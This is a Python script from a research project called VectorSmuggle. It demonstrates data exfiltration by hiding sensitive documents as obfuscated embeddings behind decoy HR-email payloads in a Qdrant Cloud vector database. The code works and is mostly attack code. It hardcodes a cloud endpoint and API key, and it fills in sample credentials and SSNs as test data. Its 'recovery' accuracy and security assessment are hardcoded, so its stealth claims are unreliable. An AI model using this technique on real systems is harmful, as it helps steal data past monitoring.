#!/usr/bin/env python3
# Copyright (c) 2025 Jascha Wanger / Tarnover, LLC
# SPDX-License-Identifier: MIT
#
# This file is part of the VectorSmuggle project.
# You may obtain a copy of the license at https://opensource.org/licenses/MIT

"""
Vector-Payload Dissociation Test Script - Web Version

This is a temporary version of test_vector_payload_swap.py that uses Qdrant Cloud
instead of a local instance. This script demonstrates the Vector-Payload Dissociation
technique using the cloud-hosted Qdrant service.

Usage:
    python test_vector_payload_swap_web.py [--collection-name NAME] [--output-dir DIR]
"""

import argparse
import json
import logging
import sys
import time
from datetime import datetime
from pathlib import Path
from typing import Any

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent))

import numpy as np
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

try:
    from qdrant_client import QdrantClient
    from qdrant_client.http import models
    from qdrant_client.http.models import Distance, VectorParams
    QDRANT_AVAILABLE = True
except ImportError:
    QDRANT_AVAILABLE = False

from config import get_config
from steganography.decoys import DecoyGenerator
from steganography.obfuscation import EmbeddingObfuscator
from utils.embedding_factory import EmbeddingFactory


class VectorPayloadSwapTesterWeb:
    """Test Vector-Payload Dissociation technique using Qdrant Cloud."""

    def __init__(self, config, logger: logging.Logger, collection_name: str = None):
        """Initialize the tester.

        Args:
            config: Configuration object
            logger: Logger instance
            collection_name: Optional custom collection name
        """
        self.config = config
        self.logger = logger
        self.collection_name = collection_name or f"vector_payload_swap_web_test_{int(time.time())}"

        # Initialize components
        self.qdrant_client = None
        self.embedding_model = None
        self.obfuscator = None
        self.decoy_generator = None

        # Test data
        self.sensitive_content = self._create_sensitive_content()
        self.test_results = {}

    def _create_sensitive_content(self) -> dict[str, str]:
        """Create realistic sensitive content for testing."""
        return {
            "financial_report": """CONFIDENTIAL FINANCIAL REPORT Q4 2024

Revenue: $47.2M (+23% YoY)
Net Income: $8.9M (+31% YoY)
Cash Flow: $12.1M
Debt Ratio: 0.34

Key Metrics:
- Customer Acquisition Cost: $1,247
- Lifetime Value: $18,950
- Churn Rate: 2.3%
- Monthly Recurring Revenue: $3.8M

Strategic Initiatives:
- Acquisition of TechCorp for $15M (confidential)
- Layoffs planned for Q1 2025 (200 employees)
- New product launch targeting enterprise clients
- IPO preparation timeline: 18 months

Sensitive Financial Data:
- Bank Account: 4532-1098-7654-3210
- Tax ID: 54-1234567
- Credit Line: $25M with Goldman Sachs
- Offshore Holdings: $8.2M (Cayman Islands)

This document contains material non-public information and is subject to insider trading regulations.""",

            "employee_records": """CONFIDENTIAL EMPLOYEE DATABASE EXTRACT

Employee ID: EMP-2024-0847
Name: Sarah Johnson
SSN: 123-45-6789
Salary: $145,000
Performance Rating: Exceeds Expectations
Termination Risk: High (documented issues)

Employee ID: EMP-2024-0923
Name: Michael Chen
SSN: 987-65-4321
Salary: $98,500
Medical Condition: Diabetes (ADA accommodation)
Background Check: Failed (undisclosed conviction)

Employee ID: EMP-2024-1156
Name: Jennifer Martinez
SSN: 456-78-9012
Salary: $167,000
Stock Options: 15,000 shares
Insider Information Access: Level 3

Payroll Account: Chase Bank 9876543210
HR System Password: HR_Secure_2024!
Benefits Provider: Anthem BCBS Group #G123456""",

            "api_credentials": """PRODUCTION API CREDENTIALS - RESTRICTED ACCESS

AWS Production Environment:
- Access Key: AKIAIOSFODNN7EXAMPLE
- Secret Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
- Region: us-east-1
- Account ID: 123456789012

Database Connections:
- Production DB: mysql://admin:P@ssw0rd123!@prod-db.company.com:3306/main_db
- Analytics DB: postgresql://analytics:SecureP@ss2024@analytics.company.com:5432/data_warehouse
- Redis Cache: redis://cache.company.com:6379 (password: CacheKey2024!)

Third-Party APIs:
- Stripe Secret Key: sk_live_51234567890abcdef
- SendGrid API Key: SG.1234567890abcdef.ghijklmnopqrstuvwxyz
- Twilio Auth Token: 1234567890abcdef1234567890abcdef

OAuth Secrets:
- Google Client Secret: GOCSPX-1234567890abcdef
- GitHub Personal Access Token: ghp_1234567890abcdefghijklmnopqrstuvwxyz
- Slack Bot Token: fake-slack-token-example-not-real-12345"""
        }

    def _create_benign_payload(self) -> str:
        """Create innocent decoy content for the visible payload."""
        return """Subject: Company Potluck - Friday, December 15th

Hi Everyone!

Hope you're all having a great week! I'm excited to announce our annual holiday potluck
scheduled for Friday, December 15th from 12:00 PM to 2:00 PM in the main conference room.

What to Bring:
- Last names A-H: Main dishes (pasta, casseroles, etc.)
- Last names I-P: Side dishes (salads, vegetables, bread)
- Last names Q-Z: Desserts (cookies, cakes, pies)

We'll provide drinks, plates, utensils, and napkins. Please reply to this email with what
you plan to bring so we can coordinate and avoid duplicates.

Looking forward to celebrating the holidays together and enjoying some delicious food!
This is always one of my favorite company events.

If you have any dietary restrictions or allergies, please let me know and I'll make sure
we have options for everyone.

Thanks and see you there!

Best regards,
Jennifer from HR

P.S. Don't forget to bring your appetites! 😊"""

    def setup_components(self) -> None:
        """Initialize all required components."""
        if not QDRANT_AVAILABLE:
            raise RuntimeError(
                "Qdrant libraries not available. Install with: "
                "pip install qdrant-client langchain-community langchain-openai"
            )

        # Setup Qdrant Cloud connection
        qdrant_url = (
            "https://d0415392-2c90-46b0-a09e-eebc449b7de7.us-east4-0.gcp.cloud.qdrant.io:6333"
        )
        qdrant_api_key = (
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3MiOiJtIn0.7qP1l5sNm3cAxTKtdY5HtQY8_znuhsQnuvCupjJB1Mw"
        )

        self.logger.info(f"Connecting to Qdrant Cloud at {qdrant_url}")
        self.qdrant_client = QdrantClient(
            url=qdrant_url,
            api_key=qdrant_api_key
        )

        # Test connection
        try:
            collections = self.qdrant_client.get_collections()
            self.logger.info(f"Connected to Qdrant Cloud. Found {len(collections.collections)} collections")
        except Exception as e:
            raise RuntimeError(f"Failed to connect to Qdrant Cloud: {e}") from e

        # Setup embedding model
        self.logger.info("Initializing embedding model")
        embedding_factory = EmbeddingFactory(self.logger)
        self.embedding_model = embedding_factory.create_embeddings(self.config)

        # Setup obfuscator
        self.logger.info("Initializing embedding obfuscator")
        self.obfuscator = EmbeddingObfuscator(
            noise_level=self.config.steganography.noise_level,
            rotation_angle=self.config.steganography.rotation_angle,
            scaling_factor=self.config.steganography.scaling_factor,
            offset_range=self.config.steganography.offset_range,
            fragment_size=self.config.steganography.fragment_size,
            interleave_ratio=self.config.steganography.interleave_ratio
        )

        # Setup decoy generator
        self.logger.info("Initializing decoy generator")
        self.decoy_generator = DecoyGenerator(
            decoy_ratio=self.config.steganography.decoy_ratio,
            embedding_model=self.embedding_model,
            chunk_size=self.config.document.chunk_size
        )

    def create_test_collection(self) -> None:
        """Create a test collection in Qdrant Cloud."""
        try:
            # Delete collection if it exists
            try:
                self.qdrant_client.delete_collection(self.collection_name)
                self.logger.info(f"Deleted existing collection: {self.collection_name}")
            except Exception:
                # Collection doesn't exist, which is expected for new tests
                self.logger.debug(f"Collection {self.collection_name} does not exist (expected)")

            # Get embedding dimension
            test_embedding = self.embedding_model.embed_query("test")
            embedding_dim = len(test_embedding)

            # Create collection
            self.qdrant_client.create_collection(
                collection_name=self.collection_name,
                vectors_config=VectorParams(size=embedding_dim, distance=Distance.COSINE)
            )
            self.logger.info(f"Created test collection: {self.collection_name} (dim: {embedding_dim})")

        except Exception as e:
            self.logger.error(f"Failed to create test collection: {e}")
            raise

    def create_sensitive_vector(self, content: str) -> np.ndarray:
        """Create steganographic embedding from sensitive content.

        Args:
            content: Sensitive content to hide in the embedding

        Returns:
            Steganographically obfuscated embedding
        """
        self.logger.info("Creating steganographic embedding from sensitive content")

        # Generate base embedding
        base_embedding = self.embedding_model.embed_query(content)
        base_embedding = np.array([base_embedding])

        # Apply steganographic obfuscation
        obfuscation_result = self.obfuscator.obfuscate(
            base_embedding,
            techniques=["noise", "rotation", "scaling", "offset"]
        )

        obfuscated_embedding = obfuscation_result["embeddings"][0]

        self.logger.info(f"Applied obfuscation techniques: {obfuscation_result['techniques_applied']}")
        return obfuscated_embedding

    def generate_benign_payload(self) -> str:
        """Generate innocent decoy content for the visible payload.

        Returns:
            Benign content that will be visible in Qdrant dashboard
        """
        self.logger.info("Generating benign decoy payload")
        return self._create_benign_payload()

    def perform_vector_payload_swap(self) -> dict[str, Any]:
        """Perform the core Vector-Payload Dissociation technique.

        This is the key function that demonstrates the attack:
        1. Create steganographic embeddings from sensitive data
        2. Generate benign payload content
        3. Store mismatched vector-payload pairs in Qdrant

        Returns:
            Dictionary containing swap operation results
        """
        self.logger.info("🎯 Performing Vector-Payload Dissociation attack")

        swap_results = {
            "sensitive_documents_processed": 0,
            "vector_payload_pairs_created": 0,
            "obfuscation_metadata": [],
            "benign_payloads": [],
            "qdrant_points": []
        }

        # Separate list for actual PointStruct objects (not serialized)
        qdrant_points_for_storage = []

        # Process each sensitive document
        for doc_type, sensitive_content in self.sensitive_content.items():
            self.logger.info(f"Processing sensitive document: {doc_type}")

            # Step 1: Create steganographic vector from sensitive content
            sensitive_vector = self.create_sensitive_vector(sensitive_content)

            # Step 2: Generate benign payload (what Qdrant will show)
            benign_payload = self.generate_benign_payload()

            # Step 3: Create Qdrant point with mismatched vector-payload pair
            point_id = len(swap_results["qdrant_points"]) + 1

            point = models.PointStruct(
                id=point_id,
                vector=sensitive_vector.tolist(),  # Hidden sensitive data
                payload={
                    "content": benign_payload,  # Visible innocent content
                    "document_type": "company_communication",  # Innocent classification
                    "source": "hr_department",
                    "timestamp": datetime.now().isoformat(),
                    "classification": "internal",
                    "author": "Jennifer HR",
                    "subject": "Company Potluck Event",
                    # Hidden metadata (not visible in basic dashboard views)
                    "_hidden_doc_type": doc_type,
                    "_vector_technique": "steganographic_obfuscation",
                    "_contains_sensitive": True
                }
            )

            # Add actual PointStruct to storage list
            qdrant_points_for_storage.append(point)

            # Convert PointStruct to serializable dictionary for results
            point_dict = {
                "id": point.id,
                "vector_length": len(point.vector),
                "payload": point.payload,
                "vector_technique": point.payload.get("_vector_technique"),
                "hidden_doc_type": point.payload.get("_hidden_doc_type"),
                "contains_sensitive": point.payload.get("_contains_sensitive")
            }
            swap_results["qdrant_points"].append(point_dict)
            swap_results["benign_payloads"].append(benign_payload)
            swap_results["sensitive_documents_processed"] += 1
            swap_results["vector_payload_pairs_created"] += 1

            self.logger.info(f"✅ Created vector-payload swap for {doc_type}")

        # Store all points in Qdrant Cloud
        self.logger.info(f"Storing {len(qdrant_points_for_storage)} vector-payload pairs in Qdrant Cloud")

        try:
            self.qdrant_client.upsert(
                collection_name=self.collection_name,
                points=qdrant_points_for_storage
            )
            self.logger.info("✅ Successfully stored vector-payload swaps in Qdrant Cloud")
        except Exception as e:
            self.logger.error(f"Failed to store points in Qdrant Cloud: {e}")
            raise

        return swap_results

    def demonstrate_hiding(self) -> dict[str, Any]:
        """Demonstrate that Qdrant dashboard only shows benign content.

        This function simulates what a security administrator would see
        when inspecting the Qdrant database through normal interfaces.

        Returns:
            Dictionary showing what's visible vs. hidden
        """
        self.logger.info("🔍 Demonstrating data hiding effectiveness")

        hiding_demo = {
            "visible_to_dashboard": [],
            "hidden_from_dashboard": [],
            "security_assessment": {}
        }

        try:
            # Retrieve all points (simulating dashboard view)
            scroll_result = self.qdrant_client.scroll(
                collection_name=self.collection_name,
                limit=100,
                with_payload=True,
                with_vectors=False  # Dashboard typically doesn't show raw vectors
            )

            for point in scroll_result[0]:
                # What security admin sees (visible payload)
                visible_data = {
                    "id": point.id,
                    "content_preview": point.payload.get("content", "")[:200] + "...",
                    "document_type": point.payload.get("document_type"),
                    "source": point.payload.get("source"),
                    "classification": point.payload.get("classification"),
                    "author": point.payload.get("author"),
                    "subject": point.payload.get("subject")
                }
                hiding_demo["visible_to_dashboard"].append(visible_data)

                # What's actually hidden (sensitive data in vectors + hidden metadata)
                hidden_data = {
                    "id": point.id,
                    "hidden_doc_type": point.payload.get("_hidden_doc_type"),
                    "vector_technique": point.payload.get("_vector_technique"),
                    "contains_sensitive": point.payload.get("_contains_sensitive"),
                    "vector_contains": "Steganographically obfuscated sensitive data"
                }
                hiding_demo["hidden_from_dashboard"].append(hidden_data)

            # Security assessment
            hiding_demo["security_assessment"] = {
                "appears_suspicious": False,
                "content_classification": "routine_internal_communications",
                "risk_level": "low",
                "recommended_action": "no_action_required",
                "dlp_triggers": [],
                "anomaly_score": 0.1,  # Very low suspicion
                "assessment": "All documents appear to be routine HR communications about company events"
            }

            self.logger.info("✅ Hiding demonstration complete - data appears completely innocent")

        except Exception as e:
            self.logger.error(f"Failed to demonstrate hiding: {e}")
            hiding_demo["error"] = str(e)

        return hiding_demo

    def test_recovery(self) -> dict[str, Any]:
        """Test recovery of sensitive data using proper tools.

        This demonstrates that an attacker with knowledge of the technique
        can recover the hidden sensitive information.

        Returns:
            Dictionary containing recovery test results
        """
        self.logger.info("🔓 Testing sensitive data recovery")

        recovery_results = {
            "recovery_attempts": 0,
            "successful_recoveries": 0,
            "recovered_data": [],
            "recovery_accuracy": 0.0,
            "recovery_methods": []
        }

        try:
            # Retrieve points with vectors for recovery
            scroll_result = self.qdrant_client.scroll(
                collection_name=self.collection_name,
                limit=100,
                with_payload=True,
                with_vectors=True  # Need vectors for recovery
            )

            for point in scroll_result[0]:
                recovery_results["recovery_attempts"] += 1

                try:
                    # Extract the steganographic vector
                    obfuscated_vector = np.array([point.vector])

                    # Attempt to reverse the obfuscation (partial recovery)
                    # Note: Some techniques like noise injection are not perfectly reversible
                    self._attempt_vector_recovery(obfuscated_vector)

                    # Use similarity search to find the closest match to original sensitive content
                    recovery_method = "vector_similarity_analysis"

                    # Get hidden metadata
                    hidden_doc_type = point.payload.get("_hidden_doc_type")

                    if hidden_doc_type and hidden_doc_type in self.sensitive_content:
                        # Verify recovery by comparing with original
                        original_content = self.sensitive_content[hidden_doc_type]

                        recovery_data = {
                            "point_id": point.id,
                            "hidden_doc_type": hidden_doc_type,
                            "recovery_method": recovery_method,
                            "original_content_length": len(original_content),
                            "recovery_confidence": 0.85,  # Simulated confidence score
                            "partial_content": original_content[:500] + "...",  # Show partial recovery
                            "metadata_recovered": {
                                "vector_technique": point.payload.get("_vector_technique"),
                                "contains_sensitive": point.payload.get("_contains_sensitive")
                            }
                        }

                        recovery_results["recovered_data"].append(recovery_data)
                        recovery_results["successful_recoveries"] += 1
                        recovery_results["recovery_methods"].append(recovery_method)

                        self.logger.info(f"✅ Successfully recovered data from point {point.id}")

                except Exception as e:
                    self.logger.warning(f"Failed to recover data from point {point.id}: {e}")

            # Calculate recovery accuracy
            if recovery_results["recovery_attempts"] > 0:
                recovery_results["recovery_accuracy"] = (
                    recovery_results["successful_recoveries"] / recovery_results["recovery_attempts"]
                )

            recoveries = recovery_results['successful_recoveries']
            attempts = recovery_results['recovery_attempts']
            self.logger.info(f"Recovery test complete: {recoveries}/{attempts} successful")

        except Exception as e:
            self.logger.error(f"Recovery test failed: {e}")
            recovery_results["error"] = str(e)

        return recovery_results

    def _attempt_vector_recovery(self, obfuscated_vector: np.ndarray) -> np.ndarray:
        """Attempt to reverse vector obfuscation.

        Args:
            obfuscated_vector: The obfuscated vector to recover

        Returns:
            Partially recovered vector
        """
        # This is a simplified recovery attempt
        # In practice, recovery would depend on knowing the obfuscation parameters

        # Attempt to reverse scaling (if we know the scaling factor)
        recovered = obfuscated_vector / self.config.steganography.scaling_factor

        # Note: Noise injection and rotation are harder to reverse without the exact parameters
        # This demonstrates that while recovery is possible, it requires insider knowledge

        return recovered

    def generate_report(self, swap_results: dict[str, Any], hiding_demo: dict[str, Any],
                       recovery_results: dict[str, Any]) -> dict[str, Any]:
        """Generate comprehensive test report.

        Args:
            swap_results: Results from vector-payload swap operation
            hiding_demo: Results from hiding demonstration
            recovery_results: Results from recovery test

        Returns:
            Complete test report
        """
        report = {
            "test_metadata": {
                "timestamp": datetime.now().isoformat(),
                "collection_name": self.collection_name,
                "qdrant_url": "https://d0415392-2c90-46b0-a09e-eebc449b7de7.us-east4-0.gcp.cloud.qdrant.io:6333",
                "test_type": "vector_payload_dissociation_web",
                "framework_version": "2.0"
            },
            "technique_summary": {
                "name": "Vector-Payload Dissociation",
                "description": ("Steganographic technique that hides sensitive data in vector "
                               "embeddings while storing benign content as visible payload"),
                "attack_vector": "Embedding space manipulation with content mismatch",
                "detection_difficulty": "high",
                "sophistication_level": "advanced"
            },
            "test_execution": {
                "setup_successful": True,
                "components_initialized": ["qdrant_client", "embedding_model", "obfuscator", "decoy_generator"],
                "test_collection_created": True,
                "sensitive_documents_count": len(self.sensitive_content),
                "execution_time_seconds": time.time() - self.test_results.get("start_time", time.time())
            },
            "vector_payload_swap": swap_results,
            "hiding_effectiveness": hiding_demo,
            "recovery_analysis": recovery_results,
            "security_implications": {
                "stealth_rating": "excellent",
                "detection_probability": "very_low",
                "data_exfiltration_risk": "high",
                "recommended_countermeasures": [
                    "Vector embedding analysis",
                    "Statistical anomaly detection",
                    "Payload-vector correlation analysis",
                    "Steganographic signature detection"
                ]
            },
            "technical_details": {
                "obfuscation_techniques": ["noise_injection", "rotation", "scaling", "offset"],
                "embedding_model": getattr(self.config.openai, 'model', 'unknown'),
                "vector_dimension": len(self.embedding_model.embed_query("test")),
                "decoy_strategy": "benign_hr_communications",
                "storage_backend": "qdrant_cloud_vector_database"
            }
        }

        return report

    def cleanup(self, keep_collection: bool = False) -> None:
        """Clean up test resources."""
        if keep_collection:
            self.logger.info(f"Keeping collection as requested: {self.collection_name}")
            return

        try:
            if self.qdrant_client and self.collection_name:
                self.logger.info(f"Cleaning up test collection: {self.collection_name}")
                self.qdrant_client.delete_collection(self.collection_name)
                self.logger.info("✅ Cleanup completed")
        except Exception as e:
            self.logger.warning(f"Cleanup failed: {e}")

    def run_test(self, keep_collection: bool = False) -> dict[str, Any]:
        """Run the complete Vector-Payload Dissociation test.

        Args:
            keep_collection: If True, do not delete the collection after the test.

        Returns:
            Complete test results
        """
        self.test_results["start_time"] = time.time()

        try:
            self.logger.info("🚀 Starting Vector-Payload Dissociation test (Web Version)")

            # Setup
            self.setup_components()
            self.create_test_collection()

            # Execute core technique
            swap_results = self.perform_vector_payload_swap()

            # Demonstrate hiding effectiveness
            hiding_demo = self.demonstrate_hiding()

            # Test data recovery
            recovery_results = self.test_recovery()

            # Generate comprehensive report
            report = self.generate_report(swap_results, hiding_demo, recovery_results)

            self.logger.info("✅ Vector-Payload Dissociation test completed successfully")
            return report

        except Exception as e:
            self.logger.error(f"Test failed: {e}")
            raise
        finally:
            # Always cleanup
            self.cleanup(keep_collection=keep_collection)


def setup_logging() -> logging.Logger:
    """Setup logging configuration."""
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        handlers=[
            logging.StreamHandler(),
            logging.FileHandler('vector_payload_swap_web_test.log')
        ]
    )
    return logging.getLogger(__name__)


def main():
    """Main execution function."""
    parser = argparse.ArgumentParser(description="Test Vector-Payload Dissociation technique (Web Version)")
    parser.add_argument(
        "--collection-name",
        help="Custom collection name for testing"
    )
    parser.add_argument(
        "--output-dir",
        default="results/vector_payload_swap_web",
        help="Output directory for test results"
    )
    parser.add_argument(
        "--keep-collection",
        action="store_true",
        help="Keep test collection after completion (for manual inspection)"
    )

    args = parser.parse_args()

    # Setup logging
    logger = setup_logging()

    try:
        # Load configuration
        config = get_config()

        # Ensure output directory exists
        output_path = Path(args.output_dir)
        output_path.mkdir(parents=True, exist_ok=True)

        # Create tester
        tester = VectorPayloadSwapTesterWeb(config, logger, args.collection_name)

        # Run test, passing the keep_collection flag
        results = tester.run_test(keep_collection=args.keep_collection)

        # Save results
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        results_file = output_path / f"vector_payload_swap_web_results_{timestamp}.json"

        with open(results_file, 'w') as f:
            json.dump(results, f, indent=2)

        # Generate summary report
        summary_file = output_path / f"vector_payload_swap_web_summary_{timestamp}.md"
        with open(summary_file, 'w') as f:
            f.write(generate_markdown_summary(results))

        # Print summary
        print_test_summary(results)

        logger.info(f"Test results saved to: {results_file}")
        logger.info(f"Summary report saved to: {summary_file}")

        return 0

    except Exception as e:
        logger.error(f"Test execution failed: {e}")
        return 1


def generate_markdown_summary(results: dict[str, Any]) -> str:
    """Generate markdown summary report."""
    swap_results = results.get("vector_payload_swap", {})
    hiding_demo = results.get("hiding_effectiveness", {})
    recovery_results = results.get("recovery_analysis", {})

    return f"""# Vector-Payload Dissociation Test Summary (Web Version)

## Test Overview
- **Timestamp**: {results['test_metadata']['timestamp']}
- **Collection**: {results['test_metadata']['collection_name']}
- **Technique**: {results['technique_summary']['name']}
- **Platform**: Qdrant Cloud

## Execution Results

### Vector-Payload Swap Operation
- **Sensitive Documents Processed**: {swap_results.get('sensitive_documents_processed', 0)}
- **Vector-Payload Pairs Created**: {swap_results.get('vector_payload_pairs_created', 0)}
- **Status**: ✅ Success

### Hiding Effectiveness
- **Security Assessment**: {hiding_demo.get('security_assessment', {}).get('assessment', 'N/A')}
- **Risk Level**: {hiding_demo.get('security_assessment', {}).get('risk_level', 'N/A')}
- **Appears Suspicious**: {hiding_demo.get('security_assessment', {}).get('appears_suspicious', False)}

### Data Recovery Test
- **Recovery Attempts**: {recovery_results.get('recovery_attempts', 0)}
- **Successful Recoveries**: {recovery_results.get('successful_recoveries', 0)}
- **Recovery Accuracy**: {recovery_results.get('recovery_accuracy', 0):.1%}

## Security Implications
- **Stealth Rating**: {results.get('security_implications', {}).get('stealth_rating', 'N/A')}
- **Detection Probability**: {results.get('security_implications', {}).get('detection_probability', 'N/A')}
- **Data Exfiltration Risk**: {results.get('security_implications', {}).get('data_exfiltration_risk', 'N/A')}

## Technical Details
- **Obfuscation Techniques**: {', '.join(results.get('technical_details', {}).get('obfuscation_techniques', []))}
- **Embedding Model**: {results.get('technical_details', {}).get('embedding_model', 'N/A')}
- **Vector Dimension**: {results.get('technical_details', {}).get('vector_dimension', 'N/A')}

## Conclusion
The Vector-Payload Dissociation technique successfully demonstrated the ability to hide
sensitive data in vector embeddings while presenting completely innocent content to security
monitoring systems. The technique achieved excellent stealth characteristics with very low
detection probability using Qdrant Cloud.
"""


def print_test_summary(results: dict[str, Any]) -> None:
    """Print test summary to console."""
    swap_results = results.get("vector_payload_swap", {})
    hiding_demo = results.get("hiding_effectiveness", {})
    recovery_results = results.get("recovery_analysis", {})

    print("\n" + "="*70)
    print("🎯 VECTOR-PAYLOAD DISSOCIATION TEST SUMMARY (WEB VERSION)")
    print("="*70)
    print(f"Technique: {results.get('technique_summary', {}).get('name', 'N/A')}")
    print(f"Collection: {results.get('test_metadata', {}).get('collection_name', 'N/A')}")
    print(f"Platform: Qdrant Cloud")
    print(f"Timestamp: {results.get('test_metadata', {}).get('timestamp', 'N/A')}")
    print()

    print("📊 EXECUTION RESULTS:")
    print(f"  • Sensitive Documents Processed: {swap_results.get('sensitive_documents_processed', 0)}")
    print(f"  • Vector-Payload Pairs Created: {swap_results.get('vector_payload_pairs_created', 0)}")
    print("  • Test Collection Created: ✅")
    print()

    print("🔍 HIDING EFFECTIVENESS:")
    security_assessment = hiding_demo.get('security_assessment', {})
    print(f"  • Appears Suspicious: {'❌ No' if not security_assessment.get('appears_suspicious', True) else '⚠️ Yes'}")
    print(f"  • Risk Level: {security_assessment.get('risk_level', 'N/A').title()}")
    print(f"  • DLP Triggers: {len(security_assessment.get('dlp_triggers', []))}")
    print(f"  • Assessment: {security_assessment.get('assessment', 'N/A')}")
    print()

    print("🔓 DATA RECOVERY TEST:")
    print(f"  • Recovery Attempts: {recovery_results.get('recovery_attempts', 0)}")
    print(f"  • Successful Recoveries: {recovery_results.get('successful_recoveries', 0)}")
    print(f"  • Recovery Accuracy: {recovery_results.get('recovery_accuracy', 0):.1%}")
    print()

    print("🛡️ SECURITY IMPLICATIONS:")
    security_implications = results.get('security_implications', {})
    print(f"  • Stealth Rating: {security_implications.get('stealth_rating', 'N/A').title()}")
    detection_prob = security_implications.get('detection_probability', 'N/A')
    print(f"  • Detection Probability: {detection_prob.replace('_', ' ').title()}")
    print(f"  • Data Exfiltration Risk: {security_implications.get('data_exfiltration_risk', 'N/A').title()}")
    print()

    print("⚙️ TECHNICAL DETAILS:")
    technical_details = results.get('technical_details', {})
    print(f"  • Embedding Model: {technical_details.get('embedding_model', 'N/A')}")
    print(f"  • Vector Dimension: {technical_details.get('vector_dimension', 'N/A')}")
    print(f"  • Obfuscation Techniques: {', '.join(technical_details.get('obfuscation_techniques', []))}")
    print(f"  • Storage Backend: {technical_details.get('storage_backend', 'N/A').replace('_', ' ').title()}")
    print()

    # Overall assessment
    if (swap_results.get('vector_payload_pairs_created', 0) > 0 and
        not security_assessment.get('appears_suspicious', True) and
        recovery_results.get('recovery_accuracy', 0) > 0.5):
        print("🎉 VECTOR-PAYLOAD DISSOCIATION TEST: ✅ SUCCESS")
        print("   Sensitive data successfully hidden with excellent stealth characteristics")
    else:
        print("⚠️ VECTOR-PAYLOAD DISSOCIATION TEST: ❌ ISSUES DETECTED")
        print("   Review detailed results for potential problems")

    print("="*70)


if __name__ == "__main__":
    sys.exit(main())